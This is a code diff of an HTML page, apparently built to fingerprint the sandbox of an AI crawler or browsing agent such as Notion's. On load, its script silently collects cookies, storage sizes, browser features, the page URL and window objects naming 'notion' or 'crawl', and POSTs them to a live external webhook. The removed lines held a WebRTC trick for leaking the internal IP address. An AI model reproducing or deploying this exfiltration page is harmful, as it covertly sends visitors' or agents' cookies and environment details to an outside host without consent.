@@ -2,61 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced JS Recon</title>
+    <title>Sandbox Fingerprinting</title>
 </head>
 <body>
-    <h1>Advanced Reconnaissance...</h1>
-    <div id="output">Running checks...</div>
-
+    <h1>Fingerprinting Sandbox...</h1>
     <script>
+        // --- PASTE YOUR HOOKDECK URL HERE ---
         const yourWebhookUrl = "https://hkdk.events/dp0gb9zztqv6wp"; 
-
-        async function getInternalIP() {
-            return new Promise((resolve) => {
-                const rtc = new RTCPeerConnection({iceServers: []});
-                rtc.createDataChannel('');
-                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                rtc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                        const match = ipRegex.exec(ice.candidate.candidate);
-                        if (match) {
-                            rtc.close();
-                            resolve(match[1]);
-                        }
-                    }
-                };
-                // Timeout just in case WebRTC is entirely disabled
-                setTimeout(() => { rtc.close(); resolve('WebRTC Disabled/Timeout'); }, 2000);
-            });
-        }
 
         async function gatherAndSendData() {
             try {
-                const internalIp = await getInternalIP();
-
                 const advancedReconData = {
-                    network: {
-                        internal_ip: internalIp
-                    },
                     sandbox_status: {
                         cookies: document.cookie || 'None',
                         localStorageLength: localStorage.length,
                         sessionStorageLength: sessionStorage.length,
                         hasFileSystemAPI: 'showOpenFilePicker' in window,
-                        hasWebUSB: 'usb' in navigator,
                         pluginsCount: navigator.plugins.length,
-                        pdfViewerEnabled: navigator.pdfViewerEnabled
+                        pdfViewerEnabled: navigator.pdfViewerEnabled,
+                        languages: navigator.languages
                     },
                     execution_context: {
                         actual_location: window.location.href,
-                        // Checking for custom injected crawler objects (naive check)
-                        hasNotionObjects: Object.keys(window).some(k => k.toLowerCase().includes('notion') || k.toLowerCase().includes('crawl'))
+                        // Checking if they inject a custom API into the window object
+                        windowKeys: Object.keys(window).filter(k => k.toLowerCase().includes('notion') || k.toLowerCase().includes('crawl'))
                     },
                     timestamp: new Date().toISOString()
                 };
-
-                document.getElementById('output').innerHTML = '<pre>' + JSON.stringify(advancedReconData, null, 2) + '</pre>';
 
                 await fetch(yourWebhookUrl, {
                     method: 'POST',
@@ -64,8 +36,8 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(advancedReconData)
                 });
-
             } catch (error) {
+                // Failsafe error logging
                 await fetch(yourWebhookUrl, {
                     method: 'POST',
                     mode: 'no-cors',
